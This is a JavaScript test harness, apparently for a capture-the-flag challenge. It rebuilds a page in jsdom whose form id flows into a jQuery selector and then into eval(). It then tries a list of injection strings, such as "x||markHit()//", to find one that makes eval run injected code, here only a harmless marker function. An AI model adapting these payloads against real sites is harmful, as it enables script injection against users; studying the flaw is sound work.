const { JSDOM } = require("jsdom");

// Build a DOM that mimics the challenge (has #template_standard, form#poly_<format>)
function makeEnv() {
  const dom = new JSDOM(`<!DOCTYPE html><html><body>
    <form id="poly_PLACEHOLDER" data-formula="x+y">
      <input id="x_standard" name="x" value="1">
      <input id="y_standard" name="y" value="2">
      <input name="formula" value="x+y">
      <div id="template_standard" hidden>Template loaded.</div>
    </form>
    <pre id="answer"></pre>
  </body></html>`, { pretendToBeVisual: true });
  const { window } = dom;
  const jqueryFactory = require("jquery");
  const $ = jqueryFactory(window);
  return { window, $ };
}

// Replicate the exact vulnerable logic
function runChallenge(format, payloadHook) {
  const { window, $ } = makeEnv();
  // rename the form id to poly_<format>
  const form = window.document.querySelector("form");
  form.id = "poly_" + format;

  const selected = form.id.replace("poly_", "");   // == format
  const this_ = form;

  // findTemplateWithJQuerySelector
  let template;
  try {
    template = $("#template_" + selected);
  } catch (e) {
    return { branch: "selector-throw", err: e.message };
  }
  if (template.length !== 0) {
    return { branch: "safe-type_standard (template found)" };
  }
  // eval branch — inject a global hook to detect execution
  window.__PWNED__ = false;
  window.markHit = () => { window.__PWNED__ = true; return "PWNED"; };
  const type_standard = () => "SAFE_OK";
  const selectedVar = selected;
  try {
    // exact: eval(`type_${selected}(this, selected)`)
    // provide type_standard + markHit + this + selected in scope
    const markHit = window.markHit;
    const thisArg = this_;
    const selected2 = selected;
    // emulate eval in a scope that has these names
    const answer = (function(){
      const this_ = thisArg, selected = selected2;
      return eval("type_" + selected + "(this, selected)");
    })();
    return { branch: "eval", ran: true, pwned: window.__PWNED__, answer: String(answer).slice(0,40) };
  } catch (e) {
    return { branch: "eval", ran: false, err: e.message };
  }
}

const candidates = [
  // goal: selector #template_<c> valid+empty; eval `type_<c>(this,selected)` runs markHit()
  "standard(this,selected)||markHit()//",
  "standard()||markHit()//",
  "standard||markHit()//",
  "x||markHit()//",
  "x&&1||markHit()//",
  " x=markHit()//",
  "0,markHit()//",
  "standard.call()||markHit()//",
  "standard`x`||markHit()//",
];

for (const c of candidates) {
  let r;
  try { r = runChallenge(c, null); } catch (e) { r = { fatal: e.message }; }
  console.log(JSON.stringify(c), "=>", JSON.stringify(r));
}
